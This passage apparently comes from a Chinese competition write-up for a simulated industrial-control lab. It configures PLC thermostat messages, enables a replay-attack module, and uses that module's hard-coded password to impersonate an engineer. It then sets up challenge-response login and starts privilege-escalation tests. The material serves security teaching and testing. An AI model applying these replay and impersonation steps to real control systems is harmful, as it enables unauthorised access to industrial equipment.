class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"ROUTE_RULES"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"main_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"LOCAL"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"device"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"LOCAL"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"logic"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里用消息路由来将多个模块的功能串起来模拟业务流程：</p><ul><li><p>开头部分描述了<strong>消息路由的名称、类型和起始模块</strong></p></li><li><p>中间部分表示<strong>当消息在起始模块位置时的格式和内容信息</strong>：</p><p>当起始模块生成消息(模块中用<code>message_create</code>函数生成，且最后激活消息参数设为NULL时）与其格式要求一致时（在这里就是消息类型为<code>MODBUS_CMD</code>，用来模拟modbus协议命令)，会被识别为该路由的起始消息</p></li><li><p>最后部分则说明消息<strong>先后通过device和logic模块</strong>后结束传递：它其实模拟了plc逻辑（用logic模块模拟）发出命令给device,由device处理后返回logic模块的过程</p></li></ul><p>当系统模拟运行时，观察设备工作目录instance&#x2F;plc&#x2F;device中日志目录message_log中的logic_send.msg文件将显示该路由中的信息，由于该过程循环进行，因此可看到大量信息</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712122119408.png" alt="image-20240712122119408"></p><hr><h4 id="模拟操作员登录行为"><a href="#模拟操作员登录行为" class="headerlink" title="模拟操作员登录行为"></a>模拟操作员登录行为</h4><blockquote><p>在task_1_1.sh脚本的“启动hacker”提示、“启动操作员站”提示和“执行操作员登录行为”提示后面打开被注释的命令，并编辑操作员用户工作目录下的operator_login.msg，添加操作员用户的名称和口令信息，而后进行试登录。如登录成功，则表明通过该过程。</p></blockquote><p>instance&#x2F;operator&#x2F;user&#x2F;operator_login.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和工程师登录一样，在<code>return_value</code>添加<code>用户名:口令</code>，用户要选择user.list里<code>&quot;role&quot;:&quot;PLC_OPERATOR&quot;</code>的</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"qian:456"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712122832291.png" alt="image-20240712122832291"></p><hr><h4 id="模拟操作员的一组plc操作"><a href="#模拟操作员的一组plc操作" class="headerlink" title="模拟操作员的一组plc操作"></a>模拟操作员的一组plc操作</h4><blockquote><p>打开task_1_1.sh最后几条注释掉的命令，然后，修改操作员用户工作目录下的plc_start.msg , plc_read_t.msg和plc_set_t.msg，分别实现打开plc温度调节开关，观察plc当前环境温度以及将plc恒温温度设置为39度（3900）的目标</p></blockquote><p>instance&#x2F;operator&#x2F;user&#x2F;plc_start.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ON"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>instance&#x2F;operator&#x2F;user&#x2F;plc_read_t.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>instance&#x2F;operator&#x2F;user&#x2F;plc_set_t.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看一下<code>(PLC_OPERATOR,PLC_CMD)</code>数据结构的定义：</p><table><thead><tr><th>元素名称</th><th>元素类型</th><th>元素大小</th><th>信息内容</th><th>备注</th></tr></thead><tbody><tr><td>plc_devname</td><td>0结尾字符串</td><td>&lt;&#x3D;32字节</td><td>设备的名称</td><td></td></tr><tr><td>action</td><td>ENUM</td><td>4字节</td><td>操作员的行为</td><td>使用enum_plc_operator_action</td></tr><tr><td>action_desc</td><td>0结尾字符串</td><td>&lt;&#x3D;32字节</td><td>操作员行为描述</td><td><strong>使用寄存器名称进行描述</strong></td></tr><tr><td>value</td><td>INT</td><td>4字节</td><td>寄存器设置的值</td><td></td></tr><tr><td>plc_operator</td><td>0结尾字符串</td><td>&lt;&#x3D;32字节</td><td>操作者的名称</td><td></td></tr><tr><td>time</td><td>INT</td><td>4字节</td><td>操作时间</td><td></td></tr></tbody></table><p>看一下操作员操作类型定义 <code>enum_plc_operator_action</code>（位于plc_emu.json）</p><table><thead><tr><th>枚举项名称</th><th>枚举数值</th><th>内容</th><th>备注</th></tr></thead><tbody><tr><td>ACTION_ON</td><td>0x01</td><td>开启操作</td><td></td></tr><tr><td>ACTION_OFF</td><td>0x02</td><td>关闭操作</td><td></td></tr><tr><td>ACTION_MONITOR</td><td>0x03</td><td>监视操作</td><td>读取寄存器信息</td></tr><tr><td>ACTION_ADJUST</td><td>0x04</td><td>设置操作</td><td>调节恒温设置、档位设置</td></tr></tbody></table><p>再看一下PLC设备寄存器设计：</p><table><thead><tr><th>寄存器名称</th><th>寄存器类型</th><th>寄存器地址</th><th>寄存器内容</th><th>备注</th></tr></thead><tbody><tr><td>device_S</td><td>coil</td><td>1</td><td>恒温箱开关</td><td>0为关闭，1为启动</td></tr><tr><td>set_T</td><td>Holding Registers</td><td>40003</td><td>恒温数值要求</td><td>短整型</td></tr><tr><td>curr_T</td><td>Input Registers</td><td>30004</td><td>恒温箱当前温度</td><td>短整型</td></tr><tr><td>heating_S</td><td>Coil</td><td>2</td><td>电热丝开关</td><td>0为关，1为制热</td></tr><tr><td>heating_G</td><td>Holding Registers</td><td>40005</td><td>电流档位</td><td>0-9档</td></tr></tbody></table><p>修改plc_start.msg，打开plc温度调节开关（这里最逆天的是要开的是电热丝）</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ON"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"heating_S"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改plc_read_t.msg，观察plc当前环境温度</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"MONITOR"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"curr_T"</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改plc_set_t.msg，将plc恒温温度设置为39度（3900）</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ADJUST"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"set_T"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">3900</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712204232928.png" alt="image-20240712204232928"></p><hr><h3 id="身份认证安全测试"><a href="#身份认证安全测试" class="headerlink" title="身份认证安全测试"></a>身份认证安全测试</h3><h4 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h4><blockquote><p>系统在工程师站engineer_station和管理中心center之间插入了一个<code>login_hacker</code><strong>实例</strong>，用该实例来模拟攻击行为。当前实例中使用了一个<code>echo_plugin</code><strong>模块</strong>，该模块只是简单地转发收到的消息，不会产生攻击行为。</p></blockquote><blockquote><p>某攻击者开发了一个<strong>重放攻击模块</strong><code>login_hacker</code>,该模块可以<strong>记录登录用户的名称与所使用的认证口令</strong>，如果攻击者使用登录过的用户名进行登录，并且在口令处使用攻击者预设的口令，则模块将自动使用以前记录的口令进行登录。</p></blockquote><blockquote><p>请用login_hacker模块替换echo_plugin模块，并且正确填写工程师用户目录下的engineer_login_nopass.msg，使攻击者可以在没有工程师用户口令的情况下在工程师站仿冒工程师进行登录。</p></blockquote><p>cube架构的实例将准备使用的模块列在plugin_config.cfg文件中，每个选用的模块都有两个名字：</p><ul><li><p>name表示实例中该模块的名称，在定义路由时使用这个名字，这个名字一般与模块在实例中的使用方式相关。</p></li><li><p>libname则是该模块开发时使用的名字，这个名字一般表现了开发者对其的定位。这里<code>echo_plugin</code>和<code>login_hacker</code>都是libname</p></li></ul><p>因为<code>task_1_2.sh</code>中的运行命令为：<code>yes | cp -a instance/login_hacker/plugin_config.cfg.task_1_2 instance/login_hacker/plugin_config.cfg </code>，所以我们只需要修改 plugin_config.cfg.task_1_2 的 libname 即可</p><p>修改后的plugin_config.cfg.task_1_2：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login_hacker"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"login_hacker"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br><blockquote><p>login_hacker模块的源码在 2024buildup&#x2F;src&#x2F;security 下面的某个同名目录中，以c语言编写，阅读其源码，可以找到所用的预设口令</p></blockquote><p>src&#x2F;security&#x2F;login_hacker&#x2F;login_hacker.c</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712164109641.png" alt="image-20240712164109641"></p><p>可知口令在这里是<code>static char security_pass[32] = &quot;Tclab2024&quot;;</code>，即<code>Tclab2024</code></p><p>拿到口令之后，修改 instance&#x2F;engineer&#x2F;user&#x2F;engineer_login_nopass.msg，在口令处使用攻击者预设的口令</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"zhao:Tclab2024"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>验证：</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712170232030.png" alt="image-20240712170232030"></p><p>可以看到第二次的时候成功登录</p><br><p>此外，也可以顺便了解下cube架构中模块的逻辑。cube架构的模块其结构比较清晰：</p><ul><li><p>一般用<code>一个模块名+init的函数（称为模块的init函数）</code>进行模块载入时的<strong>初始化操作</strong></p></li><li><p>用<code>一个模块名+start的函数（称为模块的start函数）</code>作为模块的<strong>主体</strong>，持续进行循环，每次循环检查模块接收到的消息并进行处理。</p><p>start函数根据消息的格式分流消息，让每种消息调用自己的专用操作函数。如果模块的几个处理流程共用同一种消息格式，则一般在消息处理函数中获取消息后，再根据消息内容进行第二次分流，一般而言，每个流程都有自己专门的处理函数</p></li></ul><hr><h4 id="挑战-应答机制"><a href="#挑战-应答机制" class="headerlink" title="挑战-应答机制"></a>挑战-应答机制</h4><blockquote><p>为了防范中间人攻击，我们准备用挑战-应答机制来替换掉当前使用的口令字符串哈希的认证机制。当前使用的用户端登录处理模块<code>login_user</code>和服务端登录处理模块<code>login_server</code>本身就具备了支持挑战-应答机制的能力。请正确配置参数和路由，实现挑战-应答机制，以防范重放攻击行为</p></blockquote><p>在 plugin_config.cfg 中定义模块时，可以使用<code>init_para</code>参数来为模块提供一些配置信息</p><p>配置信息的定义一般在模块的定义文件cfg中。如 login_user.cfg 中给出了<code>init_para_desc</code>的定义，定义中用mode值来表示模块采用哪一种登录机制。</p><p>plugin&#x2F;login_user.cfg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"MONITOR"</span><span class="token punctuation">,</span><span class="token property">"dynamic_lib"</span><span class="token operator">:</span><span class="token string">"liblogin_user.so"</span><span class="token punctuation">,</span><span class="token property">"init"</span><span class="token operator">:</span><span class="token string">"login_user_init"</span><span class="token punctuation">,</span><span class="token property">"start"</span><span class="token operator">:</span><span class="token string">"login_user_start"</span><span class="token punctuation">,</span><span class="token property">"init_para_desc"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"elem_no"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"elem_desc"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"mode"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>plugin模块定义时，可以用<code>&quot;init_para&quot;:&#123;&quot;mode&quot;:1&#125;</code>来表示模块选择了模式1</p><blockquote><p>请通过阅读源码确定哪种模式是挑战应答模式，并在plugin_config.cfg中正确配置</p></blockquote><p>直接全局搜索找到相关的代码</p><p>src&#x2F;system&#x2F;login_user&#x2F;login_user.c</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712174924813.png" alt="image-20240712174924813"></p><p>可知是模式2，那么plugin_config.cfg.task_1_3：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"msg_send"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"msgfile_send"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"msg_print"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"msgrecord_print"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"file_dealer"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"file_dealer"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span>        <span class="token property">"init_para"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>                <span class="token property">"mode"</span><span class="token operator">:</span><span class="token number">2</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"logic_upload"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"logic_upload"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><blockquote><p>挑战-应答机制中，用户和服务器之间会进行<strong>两次交互</strong>，而旧的消息路由只提供了一次交互流程，需要重新配置认证流程</p></blockquote><p>旧的身份认证流程是用login路由来认证的，它由engineer&#x2F;user，engineer&#x2F;station和monitor_center中定义的login路由相互连接而形成，类型为QUERY，表示该路由为登录后返回的过程。</p><p>而在支持挑战-应答机制时，<strong>login_user在收到返回消息后，会生成状态为CHALLENGE格式的登录消息，这个消息将再次发送到server端并完成登录行为</strong>。</p><p>我们把工程师站login_user收到用户登录消息后，发送消息给管理中心login_server，并获得挑战信息的过程看做是插入到原有登录过程中的新过程，就可以使用cube架构中的<strong>切面路由机制</strong>。</p><p>这个机制定义的路由一般放在aspect_policy.cfg中，选项可定为ASPECT，是指在原路由中插入了一段处理过程，处理过程完成后回到原本路由。 用路由图来描述则如下所示：</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/%E5%9B%BE%E7%89%871.png" alt="图片1"></p><p>切面路由将有自己的新名称，这里我们将新的切面路由命名为 challenge_login，在管理中心的路由配置文件中定义，可以把它当作是由切入点开始的QUERY格式路由（询问模式，发出消息抵达目标后原路返回)，最终回到切入点，再重新执行原流程。</p><p>instance&#x2F;engineer&#x2F;station&#x2F;aspect_policy.cfg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"policy_head"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span>       <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"ASPECT"</span><span class="token punctuation">,</span>        <span class="token property">"sender"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span><span class="token property">"ljump"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token property">"rjump"</span><span class="token operator">:</span><span class="token number">-2</span><span class="token punctuation">,</span><span class="token property">"newname"</span><span class="token operator">:</span><span class="token string">"challenge_login"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"MATCH_RULES"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"op"</span><span class="token operator">:</span><span class="token string">"AND"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"USER_DEFINE"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIN"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"ROUTE_RULES"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"main_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"CONN"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"center_client"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">]</span>        <span class="token property">"response_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"LOCAL"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>policy_head</code>：拦截位置</p></li><li><p><code>name</code>：被拦截路由</p></li><li><p><code>type</code>有两种取值：</p><p>复制（<code>DUP</code>）表示从原路由复制信息，不改变原路由传输方式</p><p>拦截（<code>ASPECT</code>）则是让原路由转去新路由进行处理，完成处理后无异常情况则返回原路由途径</p></li><li><p><code>ljump</code>表示是在本地路由的第几跳（生成&#x2F;收到消息为第1跳，经过一个模块增加1跳，<code>sender</code>表示路由的发送者，这两个共同定义了路由的起始位置。<code>rjump</code>是一个准备被废弃或替代的参数，在这里的唯一作用是用负值表示拦截的是返回信息。</p></li><li><p><code>newname</code>则表示复制或拦截路由所在的新路由名称，这里复制路由上的消息将沿着新路由传播，而拦截路由上的消息则在完成新路由并返回后，重新进入原路由，沿着拦截点继续传播。</p></li><li><p><code>MATCH_RULES</code>中的内容表示切面触发时消息要满足的条件，<code>ROUTE_RULES</code>则指消息在新路由中传播的路径。这里的路由可以指向其它实例，在其它实例中与其对接的路由应当是与新路由名称一致的DELIVER格式路由（与DUP格式切面路由对接）或QUERY格式路由（与ASPECT格式路由对接）。</p></li></ul><p>aspect_policy.cfg.task_1_3：直接复制<code>./instance/engineer/station/plugin_config.cfg</code>文件的内容就行，拦截-转发逻辑是预先写好的</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712191107681.png" alt="image-20240712191107681"></p><hr><h2 id="攻击模拟任务"><a href="#攻击模拟任务" class="headerlink" title="攻击模拟任务"></a>攻击模拟任务</h2><h3 id="越权访问"><a href="#越权访问" class="headerlink" title="越权访问"></a>越权访问</h3><p>本过程由用户测试系统中可以进行越权访问的位置</p><p>本系统中，工程师、操作员和系统监视员除可执行规定允许的操作外，还有如下限制：</p><ol><li>工程师可以登录操作员站和管理终端，但只能观察数据，不能执行调节温度等控制行为。</li><li>操作员可以登录管理终端，但只能观察数据，不能在监视终端执行调节温度等控制行为。</li><li>监视员可以登录操作员站，但只能观察数据，不能在监视终端执行调节温度等控制行为。</li><li>操作员和监视员均可登录工程师站，但不能执行代码上传和逻辑上传命令。</li></ol><blockquote><p>请在工程师站、操作员站和监视终端进行测试，找到可以违规操作的点</p></blockquote><p>控制行为用调节温度到39度代表，参考操作员用户目录下的plc_set_t.msg</p><p>上传命令则用代码上传代表，参考工程师用户目录下的code_upload.msg</p><p>在工程师站、操作员站和管理终端各找到两个可违规操作点，按照下表创建违规登录与操作的组合消息：</p><table><thead><tr><th>位置</th><th>编号</th><th>登录（使用非合规用户）</th><th>操作（非合规用户执行违规操作）</th><th>备注</th></tr></thead><tbody><tr><td>工程师用户</td><td>违规点1</td><td>attack_login1.msg</td><td>attack_cmd1.msg</td><td></td></tr><tr><td></td><td>违规点2</td><td>attack_login2.msg</td><td>attack_cmd2.msg</td><td></td></tr><tr><td>操作员用户</td><td>违规点3</td><td>attack_login3.msg</td><td>attack_cmd3.msg</td><td></td></tr><tr><td></td><td>违规点4</td><td>attack_login4.msg</td><td>attack_cmd4.msg</td><td></td></tr><tr><td>监视员用户</td><td>违规点5</td><td>attack_login5.msg</td><td>attack_cmd5.msg</td><td></td></tr><tr><td></td><td>违规点6</td><td>attack_login6.msg</td><td>attack_cmd6.msg</td><td></t